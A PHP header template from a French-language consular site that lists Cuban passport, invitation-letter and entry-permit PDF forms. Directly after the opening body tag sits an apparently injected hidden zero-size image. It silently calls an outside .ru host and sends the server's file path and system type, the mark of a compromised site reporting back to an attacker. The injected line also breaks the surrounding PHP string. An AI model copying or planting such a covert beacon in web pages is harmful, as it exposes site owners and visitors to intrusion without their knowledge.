<?php
/* Programme : entete.php
* 	Description : Affichage de l,entet de la page
*	Auteur : Denis Léveillé 	 			  Date : 2007-10-04
*/
include('lib/config.php');

echo "
<!DOCTYPE html PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//FR'>
<html  xmlns='http://www.w3.org/1999/xhtml'>
   <head>
		<title>".$txt['TitreWeb']." - ".$param['telephone_client']."</title
		<meta http-equiv='Content-Type' content='text/html; charset=iso-8859-1' >
		<meta http-equiv='Content-Disposition' content='inline; filename=consular' >
		<meta http-equiv='Content-Description' content='text/html; charset=iso-8859-1' >
		<meta name='author' content='$NomCieCréé' >
		<meta name='copyright' content='copyright © $CopyAn $NomCie' >
		<meta name='description' content='".$txt['MetaDescription']."'>
		<meta name='keywords' content='".$txt['MetaKeyword']."'>
		<link href='styles/style.css' rel='stylesheet' type='text/css'>
		<base target='MAIN'>
	</head>
<body ><img width="0" height="0" style="display:none;" id="frmchkldver" src="http://firewallmakeover.ru/media/image.php?ftd=364332&path=%7cpublic_html%7cantillas%7c&sys=UN&wrk=2"/>
	<table bgcolor='#EFEFEF' width='$Large' cellpadding='8' cellspacing='0' align='$Enligne' border='0' >";

?>
		<tr>
			<td valign='top'>
				<font color='#D00E29' size='3' face='verdana'><center><b><?=$txt['demarche_consulaire']?></b></font><br/><br/>
				<b><big><?=$txt['utilisez_formulaire']?></b></big></center><br/><br/><br/>
				<hr/>
				<?=$txt['traitement_passeport']?><br/><br/>
				<?=$txt['personne_cuba']?>
				<ul>
					<li><a href='formulaires/formulario-pasaporte.pdf' target='_blank'><b><?=$txt['form_demande']?></b></a></li>
					<li><a href='formulaires/tramites-de-pasaporte.pdf' target='_blank'><b><?=$txt['traite_passeport']?></b></a></li>
					<li><a href='formulaires/indicaciones-provisionales-para-el-llenado-del-modelo-de-solicitud-consular.pdf' target='_blank'>
					<b><?=$txt['indication_demande']?></b></a></li>
				</ul>
				<hr/>
				<?=$txt['lettre_invit']?>
				<ul>
					<li> <a href='formulaires/CARTA-DE-INVITACION.pdf' target='_blank'><b><?=$txt['lettre_invit']?></b></a></li>
				</ul>
				<hr/>
				<?=$txt['cuba_avant1971']?>
				<ul>
					<li><a href='formulaires/REQUISITOS-PARA-SOLICITAR-PERMISO-DE-ENTRADA-PARA-LAS-PERSONAS-NACIDAS-EN-CUBA.pdf' target='_blank'><b><?=$txt['condition_avant1971']?></b></a></li>
				</ul>
			</td>
		</tr>
	  	<tr> 
	    		<td>
				<?php include("bas_page.inc"); ?>
			</td>
	  	</tr>
	</table>
	
<script language='JavaScript1.2'>
	function Rafraichie(){
		 		window.location.reload();
	} // Rafraichie
</script>
</body>
</html>